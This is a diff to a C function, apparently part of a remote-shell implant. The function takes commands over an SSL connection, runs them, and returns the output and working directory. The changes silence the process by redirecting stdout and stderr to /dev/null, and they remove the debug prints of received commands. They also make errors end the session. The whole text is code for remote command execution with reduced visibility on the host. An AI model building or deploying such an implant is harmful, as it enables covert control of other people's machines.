@@ -92,20 +92,23 @@ void shell(SSL* ssl) {
             send_data(ssl, result);
             free(result);
         } else {
-            send_data(ssl, "Error Getting username or CWD");
+            send_data(ssl, "ERROR<sep>Error Getting username or CWD PLEASE EXIT");
+            return;
         }
     } else {
-        send_data(ssl, "Error Getting username or CWD");
+        send_data(ssl, "ERROR<sep>Error Getting username or CWD PLEASE EXIT");
+        return;
     }
 
     // Redirect stdout and stderr to /dev/null
     int dev_null = open("/dev/null", O_WRONLY);
     if (dev_null != -1) {
-        // int stdout_backup = dup(STDOUT_FILENO);  
+        int stdout_backup = dup(STDOUT_FILENO);  
         int stderr_backup = dup(STDERR_FILENO);  
         
-        if (dup2(dev_null, STDERR_FILENO) == -1) { // add back (dup2(dev_null, STDOUT_FILENO) == -1) ||
-            send_data(ssl, "Error Redirecting Output");
+        if ((dup2(dev_null, STDOUT_FILENO) == -1) || (dup2(dev_null, STDERR_FILENO) == -1)) { 
+            send_data(ssl, "ERROR<sep>Error Redirecting Output");
+            return;
         }
         
         close(dev_null);
@@ -116,10 +119,8 @@ void shell(SSL* ssl) {
     while (true) {
         char* recv_command = receive_data(ssl);
         char* command_result;
-        puts(recv_command);
         if (strcmp(recv_command, "exit") == 0) {
             free(recv_command);
-            puts("Exit");
             break;
         }
         if (strncmp(recv_command, "cd ", 3) == 0) {
@@ -144,22 +145,25 @@ void shell(SSL* ssl) {
                 char* response = (char*)malloc(total_length);
                 if (response != NULL) {
                     snprintf(response, total_length, "%s%s%s", command_result, SEP, cwd);
-                    puts(response);
                     send_data(ssl, response);
                     free(response);
                 } else {
-                    send_data(ssl, "Error Sending Response");
+                    send_data(ssl, "ERROR<sep>Error Sending Response");
+                    return;
                 }
                 free(cwd);
             } else {
-                send_data(ssl, "Error Getting CWD");
+                send_data(ssl, "ERROR<sep>Error Getting CWD");
+                return;
+
             }
             free(command_result);
         } else {
-            send_data(ssl, "Error Executing Command");
+            send_data(ssl, "ERROR<sep>Error Executing Command");
+            return;
+
         }
     }
-
     // Restore stdout and stderr
     dup2(stdout_backup, STDOUT_FILENO);
     dup2(stderr_backup, STDERR_FILENO);
